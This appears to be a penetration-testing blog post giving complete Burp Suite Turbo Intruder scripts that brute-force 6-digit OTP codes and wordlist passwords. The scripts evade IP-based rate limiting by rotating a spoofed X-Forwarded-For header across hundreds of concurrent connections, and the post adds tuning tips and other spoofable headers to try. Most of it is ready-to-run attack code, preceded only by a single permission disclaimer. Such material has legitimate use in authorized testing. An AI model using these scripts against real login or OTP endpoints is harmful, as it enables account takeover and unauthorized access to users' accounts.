---
title: "Rate Limit Bypass: OTP Brute-Force with IP Rotation"
date: "2026-04-26"
tags:
    - web
    - api
    - rate-limit
    - burp-suite
---

Many login and OTP verification endpoints rate-limit by client IP. If the application trusts a forwarded header like `X-Forwarded-For` and uses it as the rate-limit key, you can rotate that value on every request and exhaust the entire 6-digit OTP space without ever hitting the limit.

> Use only against systems you have explicit written permission to test.

---

## How to Configure

1. In Burp Suite, capture a legitimate OTP request.
2. Right-click → **Convert to Turbo Intruder attack**.
3. Replace the OTP value with `%s` in the body.
4. Add or modify the `X-Forwarded-For` header to use `%s`.

Example request template:

```
POST /verify-otp HTTP/1.1
Host: target.com
X-Forwarded-For: %s
Content-Type: application/json

{"OTP":"%s"}
```

---

## Payload — OTP Brute Force

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=300,
                          requestsPerConnection=100,
                          pipeline=False)

    # Initialize IP counter (starts at 1.1.1.1)
    ip_parts = [1, 1, 1, 1]

    for otp in range(000000, 999999):  # 000000 to 999999
        # Format current IP
        current_ip = "%d.%d.%d.%d" % tuple(ip_parts)

        # Increment IP (1.1.1.1 → 1.1.1.2 → ... → 1.1.1.255 → 1.1.2.0)
        ip_parts[3] += 1
        if ip_parts[3] > 255:
            ip_parts[3] = 1
            ip_parts[2] += 1
            if ip_parts[2] > 255:
                ip_parts[2] = 1
                ip_parts[1] += 1
                if ip_parts[1] > 255:
                    ip_parts[1] = 1
                    ip_parts[0] += 1

        # Pad OTP with leading zeros
        otp_str = str(otp).zfill(6)

        # Queue the request with parameters in correct order
        # First %s is for X-Forwarded-For (IP)
        # Second %s is for OTP in JSON body
        engine.queue(target.req, [current_ip, otp_str])


def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

---

## Payload — Password Brute Force From Wordlist

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=10,
                          pipeline=False)

    # Initialize IP counter (starts at 1.1.1.1)
    ip_parts = [1, 1, 1, 1]

    # Read all passwords from file
    with open('C:\\Burp\\passwords.txt', 'r') as f:
        passwords = [line.strip() for line in f]

    # Queue each password with rotating IP
    for password in passwords:
        # Format current IP
        current_ip = "%d.%d.%d.%d" % tuple(ip_parts)

        # Increment IP for next iteration
        ip_parts[3] += 1
        if ip_parts[3] > 255:
            ip_parts[3] = 1
            ip_parts[2] += 1
            if ip_parts[2] > 255:
                ip_parts[2] = 1
                ip_parts[1] += 1
                if ip_parts[1] > 255:
                    ip_parts[1] = 1
                    ip_parts[0] += 1

        # Queue the request with password as parameter
        # Adjust the position based on your actual request structure
        # If password should go in JSON body:
        engine.queue(target.req, [current_ip, password])
        # OR if password should be in a different parameter position:
        # engine.queue(target.req, [password, current_ip])

def handleResponse(req, interesting):
    # Customize this based on what indicates a successful login
    # Common indicators: status code 200/302, presence of certain text,
    # absence of error messages

    # Example 1: Check for non-error status codes
    if req.status != 401 and req.status != 403:
        table.add(req)

    # Example 2: Check for specific text in response
    # if "Login successful" in req.response or "Welcome" in req.response:
    #     table.add(req)

    # Example 3: Check for absence of error messages
    # if "Invalid password" not in req.response and "Login failed" not in req.response:
    #     table.add(req)
```

---

## Request Structure

Each generated request carries:

1. **Header**: `X-Forwarded-For: [current IP]` (e.g., `X-Forwarded-For: 1.1.1.1`)
2. **JSON Body**: `{"OTP": "[padded OTP]"}` (e.g., `{"OTP": "318121"}`)

### Flowchart

![Flowchart](https://raw.githubusercontent.com/0x9r4ngu/Race-Condition-Scripts/refs/heads/main/Race%20Condition.png)

---

## Attack Workflow

1. **IP Rotation**: Cycles through IPs from `1.1.1.1` to `255.255.255.255`.
2. **OTP Generation**: Tests every 6-digit combination from `000000` upward.
3. **Concurrent Execution**: 300 parallel connections × 100 requests each.
4. **Response Handling**: Any non-`404` response is flagged as potentially valid.

---

## Important Notes

- Adjust the OTP range (`000000-999999`) based on target hints — many flows only use 4-digit codes.
- Tune `concurrentConnections` based on target stability; too aggressive will cause network errors that look like rate limits.
- The IP rotation only works when the server trusts a client-controllable header (`X-Forwarded-For`, `X-Real-IP`, `True-Client-IP`, `Client-IP`, etc.) as the rate-limit key.
- High concurrency also exposes potential **race conditions** in OTP validation logic — sometimes a correct OTP can be reused or accepted twice if the verification isn't atomic.
- If `X-Forwarded-For` doesn't work, try `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`, `Forwarded`, or `Via`.
